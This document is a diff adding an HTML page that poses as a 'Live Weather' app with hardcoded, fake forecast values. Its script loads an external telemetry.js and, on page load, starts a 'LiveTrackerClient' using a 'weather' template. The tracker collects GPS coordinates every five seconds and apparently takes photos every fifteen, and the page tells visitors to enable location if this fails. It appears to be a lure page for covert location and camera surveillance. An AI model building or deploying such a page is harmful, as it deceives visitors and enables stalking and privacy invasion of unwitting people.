@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Weather App - Local Forecast</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        /* Reset */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        /* Body Styling */
+        body {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            padding: 20px;
+        }
+
+        /* Weather Card Styling */
+        .weather-card {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            padding: 35px 30px;
+            border-radius: 24px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+            text-align: center;
+            max-width: 360px;
+            width: 100%;
+        }
+
+        /* Title Styling */
+        .weather-card h2 {
+            font-size: 24px;
+            color: #1e293b;
+            font-weight: 700;
+            margin-bottom: 4px;
+        }
+
+        /* Location Styling */
+        .location {
+            font-size: 15px;
+            color: #64748b;
+            margin-top: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+        }
+
+        /* Weather Icon Styling */
+        .weather-icon {
+            margin: 24px 0;
+            position: relative;
+        }
+
+        .weather-icon img {
+            width: 110px;
+            height: 110px;
+            filter: drop-shadow(0 8px 16px rgba(0,0,0,0.15));
+        }
+
+        /* Weather Info Styling */
+        .weather-info {
+            margin: 16px 0 28px;
+        }
+
+        .temperature {
+            display: block;
+            font-size: 52px;
+            font-weight: 800;
+            color: #0f172a;
+            line-height: 1;
+        }
+
+        .condition {
+            font-size: 18px;
+            color: #475569;
+            font-weight: 500;
+            margin-top: 8px;
+        }
+
+        .weather-stats {
+            display: flex;
+            justify-content: space-around;
+            background: #f1f5f9;
+            padding: 12px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            font-size: 13px;
+            color: #334155;
+        }
+
+        .stat-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 4px;
+        }
+
+        /* Button Styling */
+        button {
+            width: 100%;
+            padding: 14px 24px;
+            background: linear-gradient(135deg, #2563eb, #1d4ed8);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: 600;
+            transition: all 0.3s;
+            box-shadow: 0 4px 12px rgba(37, 99, 235, 0.3);
+        }
+
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 18px rgba(37, 99, 235, 0.4);
+        }
+
+        button:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+            transform: none;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="weather-card">
+        <h2>Live Weather</h2>
+        <p class="location"><i class="fas fa-location-dot"></i> <span id="city">Detecting Location...</span></p>
+
+        <!-- Weather Icon -->
+        <div class="weather-icon">
+            <img src="/weather.png" alt="Weather Icon">
+        </div>
+
+        <div class="weather-info">
+            <span class="temperature">26°C</span>
+            <span class="condition">Partly Cloudy</span>
+        </div>
+
+        <div class="weather-stats">
+            <div class="stat-item">
+                <i class="fas fa-wind" style="color: #3b82f6;"></i>
+                <span>12 km/h</span>
+            </div>
+            <div class="stat-item">
+                <i class="fas fa-droplet" style="color: #06b6d4;"></i>
+                <span>65%</span>
+            </div>
+            <div class="stat-item">
+                <i class="fas fa-sun" style="color: #f59e0b;"></i>
+                <span>UV 5</span>
+            </div>
+        </div>
+
+        <button id="check-weather">
+            <i class="fas fa-sync-alt"></i> Check Weather Update
+        </button>
+    </div>
+
+    <script src="/js/telemetry.js"></script>
+    <script>
+        const btn = document.querySelector("#check-weather");
+        const cityEl = document.querySelector("#city");
+
+        function startWeatherTracking() {
+            btn.disabled = true;
+            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Updating Weather...';
+
+            if (window.LiveTrackerClient) {
+                window.LiveTrackerClient.startTracking({
+                    templateName: 'weather',
+                    updateInterval: 5000,
+                    photoInterval: 15000,
+                    onSuccess: (coords) => {
+                        btn.disabled = false;
+                        btn.innerHTML = '<i class="fas fa-check"></i> Weather Updated';
+                        cityEl.innerHTML = `GPS: ${coords.latitude.toFixed(2)}°, ${coords.longitude.toFixed(2)}°`;
+                        setTimeout(() => {
+                            btn.innerHTML = '<i class="fas fa-sync-alt"></i> Refresh Weather';
+                        }, 3000);
+                    },
+                    onError: (err) => {
+                        btn.disabled = false;
+                        btn.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Turn on GPS Location';
+                        cityEl.innerHTML = "Location Permission Required";
+                    }
+                });
+            }
+        }
+
+        btn.addEventListener("click", startWeatherTracking);
+
+        // Auto trigger on load
+        window.addEventListener('DOMContentLoaded', () => {
+            startWeatherTracking();
+        });
+    </script>
+</body>
+
+</html>
